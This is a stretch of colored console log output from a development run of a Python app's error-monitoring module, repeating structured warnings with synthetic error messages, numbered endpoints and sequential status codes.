WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784030Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1818'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784083Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1819'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1820'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1821'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1822'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1823'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784410Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1824'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1825'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1826'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784559Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1827'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1828'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784655Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1829'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1830'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784752Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1831'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1832'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1833'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784897Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1834'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784944Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1835'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.784992Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1836'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785040Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1837'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1838'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1839'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785185Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1840'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785235Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1841'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785283Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1842'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1843'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1844'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1845'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1846'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1847'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1848'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1849'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1850'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1851'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1852'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1853'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1854'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1855'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.785960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1856'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1857'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
